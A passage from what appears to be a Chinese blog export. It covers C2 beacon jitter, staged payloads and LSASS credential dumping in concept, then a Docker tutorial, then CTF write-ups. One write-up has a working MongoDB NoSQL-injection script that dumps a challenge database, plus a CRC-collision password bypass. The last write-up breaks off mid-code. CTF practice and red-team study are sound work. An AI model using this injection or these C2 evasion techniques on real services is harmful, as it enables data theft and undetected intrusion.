\n加密传输：使用自定义加密算法对通信内容进行加密，避免被检测； \n命令获取：在有新命令时获取命令，在没有新命令时只发送确认连接的报文。\n\n Beacon通信的目的主要有两个: \n\n确认连接：定期通信可以确认恶意软件与C2服务器的连接是否正常，如果长时间未通信可能代表连接出现问题； \n获取命令：在有新命令或更新时可以通过Beacon通信将其下发到恶意软件，然后用于控制受害系统。\n\n混淆代理回调Jitter众所周知，C2 的流量有一个特征就是beacon通信以及被控制的设备向C2服务器发送beacon报文的速率，简单来说，默认的 beacon 通信会使用一个时间固定的睡眠周期，这个周期默认为 60 秒\n这时候可以用 Jitter 时序扰动，在使用 Jitter 之后，我们的 C2 beacon 通信将可能呈现出一种无规律的模式，显示出的活动会更接近于普通用户\n在一些更高级的 C2 框架中，我们还可以更改一些参数来增加流量的隐蔽性，并且也可以在正在传输的文件添加垃圾数据，从而使得该文件的隐蔽性增加。\nFile JitterFile Jitter 简单来说就是通过文件操作来实现恶意软件与 C2 服务器通信时间的随机变化\n “File” Jitter的实现过程通常如下所示：\n\n恶意软件首先会确定一个命令目录，C2服务器会在该目录下放置命令文件； \n恶意软件设置一个基础等待时间，比如30秒，这会是检测新命令文件的默认时间间隔； \n每次恶意软件醒来后，它首先检查命令目录下是否有新文件，如果有，则读取文件并删除，从而获取到新命令；\n如果命令目录下没有新文件，那么恶意软件会在20到40秒(可自行设置)的随机时间范围内等待，此处需要引入Jitter； \n在等待时间结束后，恶意软件将再次检查命令目录下是否有新文件 并将循环以上过程。\n\n“File” Jitter将利用文件操作来触发通信和获取新命令；使用命令文件可以更好隐藏通信规律，从而避免直连型的恶意网络通信被检测到。\n有效载荷就像常规的反弹 shell 一样，你可以在 C2 框架中使用两种主要类型的有效载荷：无阶段有效载荷和分阶段有效载荷\n无阶段有效载荷无阶段有效载荷是两者中最简单的，他们将包含完整的 C2 代理，并将回调 C2 服务器时立即开始 beacon 通信过程\n分阶段有效载荷分阶段有效载荷需要回调到 C2 服务器以下载 C2 代理的其他部分，这个过程可以更容易的混淆代码以绕过反病毒程序\n 使用分阶段有效载荷建立C2 beacon(信标)的步骤如下： \n\n受害者下载并执行Dropper(Dropper是用于在目标系统上安装其他恶意软件或工具的恶意程序，比如可以安装C2代理、远控工具等)； \nDropper回调到C2服务器以下载第二阶段的有效载荷； \nC2服务器将第二阶段的有效载荷发送回受害者工作站；\n第二阶段的有效载荷被加载到受害者工作站的内存中； \nC2 beacon(信标)初始化，红队&#x2F;威胁参与者可以在C2服务器上与受害者机器进行互动。\n\n有效载荷格式Windows PE文件(一种Windows可执行文件格式)并不是在系统上执行代码的唯一方式，一些C2框架也可支持其他格式的有效载荷，例如： \nPowerShell脚本：它可能包含c#代码(这可以用Add-Type Commandlet来编译和执行)；HTA文件； JScript文件； Visual Basic应用程序或Visual Basic脚本； Microsoft Office文档；\n模块模块是任何C2框架的核心组件，它们能够添加一些使C2代理和C2服务器更加灵活的功能\nPost Exploitation Modules(后渗透模块)Post Exploitation(后渗透)模块是C2框架的主要组件之一，该模块可用于处理获得目标机的初始访问权限之后的任何事情，使用后渗透模块可以像运行SharpHound工具一样简单，也可以像转储LSASS和解析内存中的凭证一样复杂，此外，我们还能用后渗透模块中的ps1(Powershell)脚本来查找横向移动路径。\nPivoting Modules(跳板模块)pivoting(跳板)模块是C2框架的主要组件之一，当我们使用C2框架时，该模块能够让我们更加容易地去访问受限制的网段。如果你在目标网络中的某个系统A(A在非限制网段中)上具有管理员访问权限，那么你就可以打开“SMB Beacon”通信，它可以使计算机A通过SMB协议充当一个代理；这将可能允许受限制网段中的机器与你的C2服务器实现通信\n\n参考文献：https://www.cnblogs.com/Hekeats-L/p/17346694.html\n","tags":["内网渗透"]},{"title":"Docker基础","url":"/2025/10/17/Docker%E5%9F%BA%E7%A1%80/","content":"docker 基础常见命令：\n\n\n\n命令\n说明\n文档地址\n\n\n\ndocker pull\n拉取镜像\ndocker pull\n\n\ndocker push\n推送镜像到DockerRegistry\ndocker push\n\n\ndocker images\n查看本地镜像\ndocker images\n\n\ndocker rmi\n删除本地镜像\ndocker rmi\n\n\ndocker run\n创建并运行容器（不能重复创建）\ndocker run\n\n\ndocker stop\n停止指定容器\ndocker stop\n\n\ndocker start\n启动指定容器\ndocker start\n\n\ndocker restart\n重新启动容器\ndocker restart\n\n\ndocker rm\n删除指定容器\ndocs.docker.com\n\n\ndocker ps\n查看容器\ndocker ps\n\n\ndocker logs\n查看容器运行日志\ndocker logs\n\n\ndocker exec\n进入容器\ndocker exec\n\n\ndocker save\n保存镜像到本地压缩文件\ndocker save\n\n\ndocker load\n加载本地压缩文件到镜像\ndocker load\n\n\ndocker inspect\n查看容器详细信息\ndocker inspect\n\n\n默认情况下，每次重启虚拟机我们都需要手动启动Docker和Docker中的容器。通过命令可以实现开机自启：\n# Docker开机自启systemctl enable docker# Docker容器开机自启docker update --restart=always [容器名/容器id]\n\n以 Nginx 为例演示命令\n# 第1步，去DockerHub查看nginx镜像仓库及相关信息# 第2步，拉取Nginx镜像docker pull nginx# 第3步，查看镜像docker images# 结果如下：REPOSITORY   TAG       IMAGE ID       CREATED         SIZEnginx        latest    605c77e624dd   16 months ago   141MBmysql        latest    3218b38490ce   17 months ago   516MB# 第4步，创建并允许Nginx容器docker run -d --name nginx -p 80:80 nginx# 第5步，查看运行中容器docker ps# 也可以加格式化方式访问，格式会更加清爽docker ps --format &quot;table &#123;&#123;.ID&#125;&#125;\\t&#123;&#123;.Image&#125;&#125;\\t&#123;&#123;.Ports&#125;&#125;\\t&#123;&#123;.Status&#125;&#125;\\t&#123;&#123;.Names&#125;&#125;&quot;# 第6步，访问网页，地址：http://虚拟机地址# 第7步，停止容器docker stop nginx# 第8步，查看所有容器docker ps -a --format &quot;table &#123;&#123;.ID&#125;&#125;\\t&#123;&#123;.Image&#125;&#125;\\t&#123;&#123;.Ports&#125;&#125;\\t&#123;&#123;.Status&#125;&#125;\\t&#123;&#123;.Names&#125;&#125;&quot;# 第9步，再次启动nginx容器docker start nginx# 第10步，再次查看容器docker ps --format &quot;table &#123;&#123;.ID&#125;&#125;\\t&#123;&#123;.Image&#125;&#125;\\t&#123;&#123;.Ports&#125;&#125;\\t&#123;&#123;.Status&#125;&#125;\\t&#123;&#123;.Names&#125;&#125;&quot;# 第11步，查看容器详细信息docker inspect nginx# 第12步，进入容器,查看容器内目录docker exec -it nginx bash# 或者，可以进入MySQLdocker exec -it mysql mysql -uroot -p# 第13步，删除容器docker rm nginx# 发现无法删除，因为容器运行中，强制删除容器docker rm -f nginx\n\n可以给常用 Docker 命令起别名，方便访问\n# 修改/root/.bashrc文件vi /root/.bashrc内容如下：# .bashrc# User specific aliases and functionsalias rm=&#x27;rm -i&#x27;alias cp=&#x27;cp -i&#x27;alias mv=&#x27;mv -i&#x27;alias dps=&#x27;docker ps --format &quot;table &#123;&#123;.ID&#125;&#125;\\t&#123;&#123;.Image&#125;&#125;\\t&#123;&#123;.Ports&#125;&#125;\\t&#123;&#123;.Status&#125;&#125;\\t&#123;&#123;.Names&#125;&#125;&quot;&#x27;alias dis=&#x27;docker images&#x27;# Source global definitionsif [ -f /etc/bashrc ]; then        . /etc/bashrcfi\n\n然后执行命令使别名生效\n数据卷容器是隔离环境，容器内程序的文件、配置、运行时产生的容器都在容器内部，我们要读写容器内的文件非常不方便，这增强了安全性，但也会为维护带来一些困难，如下列的问题：\n\n如果要升级MySQL版本，需要销毁旧容器，那么数据岂不是跟着被销毁了？\nMySQL、Nginx容器运行后，如果我要修改其中的某些配置该怎么办？\n我想要让Nginx代理我的静态资源怎么办\n\n因此，容器提供程序的运行环境，但是程序运行产生的数据、程序运行依赖的配置都应该与容器解耦\n什么是数据卷数据卷是一个虚拟目录，是容器内目录和宿主机目录之间映射的桥梁\n以 Nginx 为例，Nginx 中有两个关键的目录：\n\nhtml：放置一些静态资源\nconf：放置配置文件\n\n如果要让 Nginx 代理我们的静态资源，最好是放在 html 目录中，如果要修改 Nginx 的配置，最好是找到 conf 下的 nginx.conf 文件\n但这时候问题就来了，容器内 Nginx 的所以文件都与物理机隔离，所以我们必须利用数据卷将两个目录与宿主机关联，方便操作\n\n在上图中我们创建了两个数据卷：conf 和 html，Nginx 容器内部的两个目录分别与两个数据库关联，而数据卷 conf 和 html 分别指向了宿主机的/var/lib/docker/volumes/conf/_data目录和/var/lib/docker/volumes/html/_data目录\n这样就成功将容器内的 conf 和 html 目录挂载在宿主机的 conf 和 html 目录上，此时我们操作宿主机的文件就是操作容器内的对应文件，只要我们将静态资源放入宿主机对应目录就可以被 Nginx 代理\n数据卷命令\n\n\n命令\n说明\n文档地址\n\n\n\ndocker volume create\n创建数据卷\ndocker volume create\n\n\ndocker volume ls\n查看所有数据卷\ndocs.docker.com\n\n\ndocker volume rm\n删除指定数据卷\ndocs.docker.com\n\n\ndocker volume inspect\n查看某个数据卷的详情\ndocs.docker.com\n\n\ndocker volume prune\n清除数据卷\ndocker volume prune\n\n\n（容器与数据卷的挂载要在创建容器时配置，已经创建好的容器不能设置数据卷，而且创建容器的过程中，数据卷会自动创建\n例：\n# 1.首先创建容器并指定数据卷，注意通过 -v 参数来指定数据卷docker run -d --name nginx -p 80:80 -v html:/usr/share/nginx/html nginx# 2.然后查看数据卷docker volume ls# 结果DRIVER    VOLUME NAMElocal     29524ff09715d3688eae3f99803a2796558dbd00ca584a25a4bbc193ca82459flocal     html# 3.查看数据卷详情docker volume inspect html# 结果[    &#123;        &quot;CreatedAt&quot;: &quot;2024-05-17T19:57:08+08:00&quot;,        &quot;Driver&quot;: &quot;local&quot;,        &quot;Labels&quot;: null,        &quot;Mountpoint&quot;: &quot;/var/lib/docker/volumes/html/_data&quot;,        &quot;Name&quot;: &quot;html&quot;,        &quot;Options&quot;: null,        &quot;Scope&quot;: &quot;local&quot;    &#125;]# 4.查看/var/lib/docker/volumes/html/_data目录ll /var/lib/docker/volumes/html/_data# 可以看到与nginx的html目录内容一样，结果如下：总用量 8-rw-r--r--. 1 root root 497 12月 28 2021 50x.html-rw-r--r--. 1 root root 615 12月 28 2021 index.html# 5.进入该目录，并随意修改index.html内容cd /var/lib/docker/volumes/html/_datavi index.html# 6.打开页面，查看效果# 7.进入容器内部，查看/usr/share/nginx/html目录内的文件是否变化docker exec -it nginx bash\n\n匿名数据卷当容器声明了一个本地目录，需要挂载数据卷，但数据卷未定义，这就是匿名卷，这时候 Docker 会在/var/lib/docker/volumes 里随机生成一个类似这样的目录：  \n/var/lib/docker/volumes/1a2b3c4d5e6f7g8h9i/_data\n\n然后挂载到容器的/data目录中\n这样做可以简化镜像的通用性，不需要知道宿主机的路径，不论用户在哪台机器上运行，数据都自动保存到一个匿名卷中，镜像自动管理自己的卷，让镜像更容易复用和分发\n但是缺点是不好管理数据卷\n同理，也不一定要将数据卷挂载在 docker 那么深的目录里，我们可以直接将容器目录与宿主机指定目录挂载\n本地目录挂载注意：本地目录或文件必须以 &#x2F; 或 .&#x2F;开头，如果直接以名字开头，会被识别为数据卷名而非本地目录名\n# 1.删除原来的MySQL容器docker rm -f mysql# 2.进入root目录cd ~# 3.创建并运行新mysql容器，挂载本地目录docker run -d \\  --name mysql \\  -p 3306:3306 \\  -e TZ=Asia/Shanghai \\  -e MYSQL_ROOT_PASSWORD=123 \\  -v ./mysql/data:/var/lib/mysql \\  -v ./mysql/conf:/etc/mysql/conf.d \\  -v ./mysql/init:/docker-entrypoint-initdb.d \\  mysql# 4.查看root目录，可以发现~/mysql/data目录已经自动创建好了ls -l mysql# 结果：总用量 4drwxr-xr-x. 2 root    root   20 5月  19 15:11 confdrwxr-xr-x. 7 polkitd root 4096 5月  19 15:11 datadrwxr-xr-x. 2 root    root   23 5月  19 15:11 init# 查看data目录，会发现里面有大量数据库数据，说明数据库完成了初始化ls -l data# 5.查看MySQL容器内数据# 5.1.进入MySQLdocker exec -it mysql mysql -uroot -p123# 5.2.查看编码表show variables like &quot;%char%&quot;;# 5.3.结果，发现编码是utf8mb4没有问题+--------------------------+--------------------------------+| Variable_name            | Value                          |+--------------------------+--------------------------------+| character_set_client     | utf8mb4                        || character_set_connection | utf8mb4                        || character_set_database   | utf8mb4                        || character_set_filesystem | binary                         || character_set_results    | utf8mb4                        || character_set_server     | utf8mb4                        || character_set_system     | utf8mb3                        || character_sets_dir       | /usr/share/mysql-8.0/charsets/ |+--------------------------+--------------------------------+# 6.查看数据# 6.1.查看数据库show databases;# 结果，hmall是黑马商城数据库+--------------------+| Database           |+--------------------+| hmall              || information_schema || mysql              || performance_schema || sys                |+--------------------+5 rows in set (0.00 sec)# 6.2.切换到hmall数据库use hmall;# 6.3.查看表show tables;# 结果：+-----------------+| Tables_in_hmall |+-----------------+| address         || cart            || item            || order           || order_detail    || order_logistics || pay_order       || user            |+-----------------+# 6.4.查看address表数据+----+---------+----------+--------+----------+-------------+---------------+-----------+------------+-------+| id | user_id | province | city   | town     | mobile      | street        | contact   | is_default | notes |+----+---------+----------+--------+----------+-------------+---------------+-----------+------------+-------+| 59 |       1 | 北京     | 北京   | 朝阳区    | 13900112222 | 金燕龙办公楼   | 李佳诚    | 0          | NULL  || 60 |       1 | 北京     | 北京   | 朝阳区    | 13700221122 | 修正大厦       | 李佳红    | 0          | NULL  || 61 |       1 | 上海     | 上海   | 浦东新区  | 13301212233 | 航头镇航头路   | 李佳星    | 1          | NULL  || 63 |       1 | 广东     | 佛山   | 永春      | 13301212233 | 永春武馆       | 李晓龙    | 0          | NULL  |+----+---------+----------+--------+----------+-------------+---------------+-----------+------------+-------+4 rows in set (0.00 sec)\n\n镜像虽然我们基本一直在用别人 pull 的镜像，但是我们也要了解一些如何打包一个镜像\n镜像结构首先来了解一下镜像的结构\n镜像之所以能让我们快速跨操作系统应用而忽略运行环境的配置，就是因为镜像中已经包含了程序运行需要的系统函数库、环境、配置、依赖\n因此，自定义镜像的本质就是依次准备好程序运行所需的基础环境，依赖，程序本身，运行配置等文件，并打包而成\n比如我们要从零部署一个 Java 应用，流程大概如下：\n\n准备一个 Linux 服务\n按照 jdk\n上传 jar 包\n运行 jar 包\n\n所以我们打包镜像也是如下步骤：\n\n准备 Linux 运行环境\n安装并配置 jdk\n上传 jar 包\n配置运行脚本\n\n上述的操作其实本质都是在生产一些文件，所以镜像就是一堆文件的集合\n但要注意镜像文件不是随意堆放的，而是按照操作的步骤分层叠加而成，每一层形成的文件都会单独打包并标记一个唯一 id，称为Layer（层）。如果我们构建时用到的某些层其他人已经制作过，就可以直接拷贝使用这些层，而不用重复制作\n就比如第一步的 Linux 运行环境，Docker 官方已经制作了这样只包含 Linux 运行环境的镜像，我们在制作 java 镜像时就无需重复制作，省心省力\ndockerfile由于制作镜像的过程中，需要逐层处理和打包，非常复杂，也容易因为一些莫名其妙的问题导致镜像出问题，所以 Docker 就提供了自动打包镜像的功能，我们只要将打包的过程，每一层要做的事情用固定的语法写下来，交给 Docker 去执行就好\n而这种记录镜像结构的文件就称为Dockerfile，其对应的语法可以参考官方文档：\nhttps://docs.docker.com/engine/reference/builder/\n\n\n\n指令\n说明\n示例\n\n\n\nFROM\n指定基础镜像\nFROM centos:6\n\n\nENV\n设置环境变量，可在后面指令使用\nENV key value\n\n\nCOPY\n拷贝本地文件到镜像的指定目录\nCOPY ./xx.jar /tmp/app.jar\n\n\nRUN\n执行Linux的shell命令，一般是安装过程的命令\nRUN yum install gcc\n\n\nEXPOSE\n指定容器运行时监听的端口，是给镜像使用者看的\nEXPOSE 8080\n\n\nENTRYPOINT\n镜像中应用的启动命令，容器运行时调用\nENTRYPOINT java -jar xx.jar\n\n\n例如，要基于 Ubuntu 镜像构建一个 Java 应用，其 Dockerfile 内容如下：\n# 指定基础镜像FROM ubuntu:16.04# 配置环境变量，JDK的安装目录、容器内时区ENV JAVA_DIR=/usr/localENV TZ=Asia/Shanghai# 拷贝jdk和java项目的包COPY ./jdk8.tar.gz $JAVA_DIR/COPY ./docker-demo.jar /tmp/app.jar# 设定时区RUN ln -snf /usr/share/zoneinfo/$TZ /etc/localtime &amp;&amp; echo $TZ &gt; /etc/timezone# 安装JDKRUN cd $JAVA_DIR \\ &amp;&amp; tar -xf ./jdk8.tar.gz \\ &amp;&amp; mv ./jdk1.8.0_144 ./java8# 配置环境变量ENV JAVA_HOME=$JAVA_DIR/java8ENV PATH=$PATH:$JAVA_HOME/bin# 指定项目监听的端口EXPOSE 8080# 入口，java项目的启动命令ENTRYPOINT [&quot;java&quot;, &quot;-jar&quot;, &quot;/app.jar&quot;]\n\n同时也有人提供了基础的系统加 jdk 环境，在此基础上制作 java 镜像更加便利\n# 基础镜像FROM openjdk:11.0-jre-buster# 设定时区ENV TZ=Asia/ShanghaiRUN ln -snf /usr/share/zoneinfo/$TZ /etc/localtime &amp;&amp; echo $TZ &gt; /etc/timezone# 拷贝jar包COPY docker-demo.jar /app.jar# 入口ENTRYPOINT [&quot;java&quot;, &quot;-jar&quot;, &quot;/app.jar&quot;]\n\n构建镜像Dockerfile 文件写好后就可以利用命令构建镜像了\n# 进入镜像目录cd /root/demo# 开始构建docker build -t docker-demo:1.0 .或：//# 直接指定Dockerfile目录//docker build -t docker-demo:1.0 /root/demo\n\n\ndocker build : 就是构建一个docker镜像\n-t docker-demo:1.0 ：-t参数是指定镜像的名称（repository和tag）\n. : 最后的点是指构建时Dockerfile所在路径，由于我们进入了demo目录，所以指定的是.代表当前目录，也可以直接指定Dockerfile目录\n\n然后就可以尝试运行：\n# 1.创建并运行容器docker run -d --name dd -p 8080:8080 docker-demo:1.0# 2.查看容器dps# 结果CONTAINER ID   IMAGE             PORTS                                                  STATUS         NAMES78a000447b49   docker-demo:1.0   0.0.0.0:8080-&gt;8080/tcp, :::8090-&gt;8090/tcp              Up 2 seconds   ddf63cfead8502   mysql             0.0.0.0:3306-&gt;3306/tcp, :::3306-&gt;3306/tcp, 33060/tcp   Up 2 hours     mysql# 3.访问curl localhost:8080/hello/count# 结果hello world\n\n网络Java 项目往往需要访问各种其他中间件如 MySQL、Redis 等，在容器内毫无疑问是可以互相访问的，但是容器之间呢\n首先，我们查看下MySQL容器的详细信息，重点关注其中的网络IP地址：\n# 1.用基本命令，寻找Networks.bridge.IPAddress属性docker inspect mysql# 也可以使用format过滤结果docker inspect --format=&#x27;&#123;&#123;range .NetworkSettings.Networks&#125;&#125;&#123;&#123;println .IPAddress&#125;&#125;&#123;&#123;end&#125;&#125;&#x27; mysql# 得到IP地址如下：172.17.0.2# 2.然后通过命令进入dd容器docker exec -it dd bash# 3.在容器内，通过ping命令测试网络ping 172.17.0.2# 结果PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.053 ms64 bytes from 172.17.0.2: icmp_seq=2 ttl=64 time=0.059 ms64 bytes from 172.17.0.2: icmp_seq=3 ttl=64 time=0.058 ms\n\n可以互联\n但是容器的 ip 其实是一个虚拟 ip，并不与某个容器绑定，如果我们在开发时写死某个IP，而在部署时很可能MySQL容器的IP会发生变化，连接会失败\n所以我们必须借助 docker 的网络功能解决这个问题\nhttps://docs.docker.com/engine/reference/commandline/network/\n\n\n\n命令\n说明\n文档地址\n\n\n\ndocker network create\n创建一个网络\ndocker network create\n\n\ndocker network ls\n查看所有网络\ndocs.docker.com\n\n\ndocker network rm\n删除指定网络\ndocs.docker.com\n\n\ndocker network prune\n清除未使用的网络\ndocs.docker.com\n\n\ndocker network connect\n使指定容器连接加入某网络\ndocs.docker.com\n\n\ndocker network disconnect\n使指定容器连接离开某网络\ndocker network disconnect\n\n\ndocker network inspect\n查看网络详细信息\ndocker network inspect\n\n\n# 1.首先通过命令创建一个网络docker network create hmall# 2.然后查看网络docker network ls# 结果：NETWORK ID     NAME      DRIVER    SCOPE639bc44d0a87   bridge    bridge    local403f16ec62a2   hmall     bridge    local0dc0f72a0fbb   host      host      localcd8d3e8df47b   none      null      local# 其中，除了hmall以外，其它都是默认的网络# 3.让dd和mysql都加入该网络，注意，在加入网络时可以通过--alias给容器起别名# 这样该网络内的其它容器可以用别名互相访问！# 3.1.mysql容器，指定别名为db，另外每一个容器都有一个别名是容器名docker network connect hmall mysql --alias db# 3.2.db容器，也就是我们的java项目docker network connect hmall dd# 4.进入dd容器，尝试利用别名访问db# 4.1.进入容器docker exec -it dd bash# 4.2.用db别名访问ping db# 结果PING db (172.18.0.2) 56(84) bytes of data.64 bytes from mysql.hmall (172.18.0.2): icmp_seq=1 ttl=64 time=0.070 ms64 bytes from mysql.hmall (172.18.0.2): icmp_seq=2 ttl=64 time=0.056 ms# 4.3.用容器名访问ping mysql# 结果：PING mysql (172.18.0.2) 56(84) bytes of data.64 bytes from mysql.hmall (172.18.0.2): icmp_seq=1 ttl=64 time=0.044 ms64 bytes from mysql.hmall (172.18.0.2): icmp_seq=2 ttl=64 time=0.054 ms\n\n此时无需记住 ip 地址也可以实现容器互联\n"},{"title":"NSSCTF 4th-wp","url":"/2025/08/24/NSSCTF-4th-wp/","content":"依旧是单军奋战这一块，而且下午睡到 5 点多才想起来还有这么个比赛，半个小时速通两道 WEB 题这一块\nWEBez_signin这题就是典型的 MongoDB NoSQL 注入，突破口在源码里 POST &#x2F;search 接受 JSON 时，title&#x2F;author 如果是 dict 会被原样拼进查询，没有加 $eq 且不做净化，所以可以直接塞 $ne &#x2F; $regex 等操作符来“放大查询”拿到库里全部书、然后做一轮搜索搜出 flagexp：\nimport requests, re, jsonbase = &quot;http://node8.anna.nssctf.cn:27612&quot;def dump_all():    # 取全量（有标题的都来）    r = requests.post(base + &quot;/search&quot;,                      headers=&#123;&quot;Content-Type&quot;:&quot;application/json&quot;&#125;,                      json=&#123;&quot;title&quot;: &#123;&quot;$ne&quot;: None&#125;&#125;)    r.raise_for_status()    data = r.json()    print(f&quot;[+] got &#123;len(data)&#125; docs&quot;)    for d in data:        print(json.dumps(d, ensure_ascii=False))    return datadef grep_flag(docs):    pat = re.compile(r&#x27;(?:nssctf|flag)\\&#123;[^&#125;]&#123;0,200&#125;\\&#125;&#x27;, re.I)    for d in docs:        for k in (&quot;title&quot;,&quot;author&quot;,&quot;description&quot;):            v = (d.get(k) or &quot;&quot;)            m = pat.search(v)            if m:                print(&quot;[!] FLAG =&gt;&quot;, m.group(0))                return True    return Falseif __name__ == &quot;__main__&quot;:    docs = dump_all()    if not grep_flag(docs):        # 再做一轮模糊搜        for field in (&quot;title&quot;,&quot;author&quot;,&quot;description&quot;):            r = requests.post(base + &quot;/search&quot;,                headers=&#123;&quot;Content-Type&quot;:&quot;application/json&quot;&#125;,                json=&#123;field: &#123;&quot;$regex&quot;: &quot;flag|nssctf&quot;, &quot;$options&quot;:&quot;i&quot;&#125;&#125;)            try:                data = r.json()            except:                continue            if grep_flag(data):                break\n\nezCRCCRC 碰撞，题目中是 CRC16 和 CRC8 的碰撞，写一个脚本计算在保持 CRC16 和 CRC8 值不变的情况下，生成一个与原密码不同的碰撞密码\n脚本当然是 ai 这一块\nimport numpy as npSECRET_PASS = b&quot;Enj0yNSSCTF4th!&quot;length = len(SECRET_PASS)CRC16_POLY = 0xA001CRC8_TABLE = [    0x00,0x07,0x0E,0x09,0x1C,0x1B,0x12,0x15,0x38,0x3F,0x36,0x31,0x24,0x23,0x2A,0x2D,    0x70,0x77,0x7E,0x79,0x6C,0x6B,0x62,0x65,0x48,0x4F,0x46,0x41,0x54,0x53,0x5A,0x5D,    0xE0,0xE7,0xEE,0xE9,0xFC,0xFB,0xF2,0xF5,0xD8,0xDF,0xD6,0xD1,0xC4,0xC3,0xCA,0xCD,    0x90,0x97,0x9E,0x99,0x8C,0x8B,0x82,0x85,0xA8,0xAF,0xA6,0xA1,0xB4,0xB3,0xBA,0xBD,    0xC7,0xC0,0xC9,0xCE,0xDB,0xDC,0xD5,0xD2,0xFF,0xF8,0xF1,0xF6,0xE3,0xE4,0xED,0xEA,    0xB7,0xB0,0xB9,0xBE,0xAB,0xAC,0xA5,0xA2,0x8F,0x88,0x81,0x86,0x93,0x94,0x9D,0x9A,    0x27,0x20,0x29,0x2E,0x3B,0x3C,0x35,0x32,0x1F,0x18,0x11,0x16,0x03,0x04,0x0D,0x0A,    0x57,0x50,0x59,0x5E,0x4B,0x4C,0x45,0x42,0x6F,0x68,0x61,0x66,0x73,0x74,0x7D,0x7A,    0x89,0x8E,0x87,0x80,0x95,0x92,0x9B,0x9C,0xB1,0xB6,0xBF,0xB8,0xAD,0xAA,0xA3,0xA4,    0xF9,0xFE,0xF7,0xF0,0xE5,0xE2,0xEB,0xEC,0xC1,0xC6,0xCF,0xC8,0xDD,0xDA,0xD3,0xD4,    0x69,0x6E,0x67,0x60,0x75,0x72,0x7B,0x7C,0x51,0x56,0x5F,0x58,0x4D,0x4A,0x43,0x44,    0x19,0x1E,0x17,0x10,0x05,0x02,0x0B,0x0C,0x21,0x26,0x2F,0x28,0x3D,0x3A,0x33,0x34,    0x4E,0x49,0x40,0x47,0x52,0x55,0x5C,0x5B,0x76,0x71,0x78,0x7F,0x6A,0x6D,0x64,0x63,    0x3E,0x39,0x30,0x37,0x22,0x25,0x2C,0x2B,0x06,0x01,0x08,0x0F,0x1A,0x1D,0x14,0x13,    0xAE,0xA9,0xA0,0xA7,0xB2,0xB5,0xBC,0xBB,0x96,0x91,0x98,0x9F,0x8A,0x8D,0x84,0x83,    0xDE,0xD9,0xD0,0xD7,0xC2,0xC5,0xCC,0xCB,0xE6,0xE1,0xE8,0xEF,0xFA,0xFD,0xF4,0xF3]# 生成 CRC16 和 CRC8 矩阵（这里简化处理：只修改最后 3 个字节）def compute_crc16_simple(data):    crc = 0xFFFF    for b in data:        crc ^= b        for _ in range(8):            crc = (crc &gt;&gt; 1) ^ CRC16_POLY if crc &amp; 1 else crc &gt;&gt; 1    return crcdef compute_crc8_simple(data):    crc = 0    for b in data:        crc = CRC8_TABLE[(crc ^ b) &amp; 0xFF]    return crc# 构造线性系统求解修改字节def gf2_solve(crc_target16, crc_target8, original):    # 我们修改最后3个字节，创建 24 位 GF(2) 方程    # 这里用暴力线性搜索示例，可优化为矩阵求解    for b1 in range(256):        for b2 in range(256):            for b3 in range(256):                candidate = bytearray(original)                candidate[-3] ^= b1                candidate[-2] ^= b2                candidate[-1] ^= b3                if candidate != original and compute_crc16_simple(candidate) == crc_target16 and compute_crc8_simple(candidate) == crc_target8:                    return bytes(candidate)    return Nonecrc16_val = compute_crc16_simple(SECRET_PASS)crc8_val = compute_crc8_simple(SECRET_PASS)collision = gf2_solve(crc16_val, crc8_val, SECRET_PASS)if collision:    print(f&quot;原密码: &#123;SECRET_PASS&#125;&quot;)    print(f&quot;碰撞密码: &#123;collision&#125;&quot;)    print(f&quot;CRC16: &#123;compute_crc16_simple(collision)&#125;, CRC8: &#123;compute_crc8_simple(collision)&#125;&quot;)else:    print(&quot;未找到碰撞密码&quot;)\n运行结果：\n原密码: b&#x27;Enj0yNSSCTF4th!&#x27;碰撞密码: b&#x27;Enj0yNSSCTF4&#123;(%&#x27;CRC16: 17262, CRC8: 163\nPOST 提交 pass=Enj0yNSSCTF4&#123;(% 即可获得flag\n","tags":["CTF"]},{"title":"LilCTF2025-wp","url":"/2025/08/15/LilCTF2025-wp/","content":"比赛这两天一直在驾校练车，没时间打比赛，所以没出几道，排名也是很拉，就不放截图了\nCRYPTO密码没学过，全是ai\nez_mathfrom sage.all import *from Crypto.Util.number import *flag = b&#x27;LILCTF&#123;test_flag&#125;&#x27;[7:-1]lambda1 = bytes_to_long(flag[:len(flag)//2])lambda2 = bytes_to_long(flag[len(flag)//2:])p = getPrime(512)def mul(vector, c):    return [vector[0]*c, vector[1]*c]v1 = [getPrime(128), getPrime(128)]v2 = [getPrime(128), getPrime(128)]A = matrix(GF(p), [v1, v2])B = matrix(GF(p), [mul(v1,lambda1), mul(v2,lambda2)])C = A.inverse() * Bprint(f&#x27;p = &#123;p&#125;&#x27;)print(f&#x27;C = &#123;str(C).replace(&quot; &quot;, &quot;,&quot;).replace(&quot;\\n&quot;, &quot;,&quot;).replace(&quot;[,&quot;, &quot;[&quot;)&#125;&#x27;)# p = 9620154777088870694266521670168986508003314866222315790126552504304846236696183733266828489404860276326158191906907396234236947215466295418632056113826161# C = [7062910478232783138765983170626687981202937184255408287607971780139482616525215270216675887321965798418829038273232695370210503086491228434856538620699645,7096268905956462643320137667780334763649635657732499491108171622164208662688609295607684620630301031789132814209784948222802930089030287484015336757787801],[7341430053606172329602911405905754386729224669425325419124733847060694853483825396200841609125574923525535532184467150746385826443392039086079562905059808,2557244298856087555500538499542298526800377681966907502518580724165363620170968463050152602083665991230143669519866828587671059318627542153367879596260872]\nexp: \n# -*- coding: utf-8 -*-# Recover lambda1, lambda2 from C = A^&#123;-1&#125; * (diag(lambda1, lambda2) * A)# Key: eigenvalues(C) over GF(p) are exactly lambda1, lambda2 (mod p).from Crypto.Util.number import long_to_bytes# ======= 填入已知参数（可替换）=======p = 9620154777088870694266521670168986508003314866222315790126552504304846236696183733266828489404860276326158191906907396234236947215466295418632056113826161C = [    [7062910478232783138765983170626687981202937184255408287607971780139482616525215270216675887321965798418829038273232695370210503086491228434856538620699645,     7096268905956462643320137667780334763649635657732499491108171622164208662688609295607684620630301031789132814209784948222802930089030287484015336757787801],    [7341430053606172329602911405905754386729224669425325419124733847060694853483825396200841609125574923525535532184467150746385826443392039086079562905059808,     2557244298856087555500538499542298526800377681966907502518580724165363620170968463050152602083665991230143669519866828587671059318627542153367879596260872]]# 如果你要换数据，把上面 p、C 两个块替换掉即可。# ======= 工具函数（Tonelli–Shanks 求模平方根，适用于任意奇素数 p）=======def tonelli_shanks(n, p):    &quot;&quot;&quot;Solve x^2 ≡ n (mod p) for odd prime p. Return one root or None.&quot;&quot;&quot;    n %= p    if n == 0:        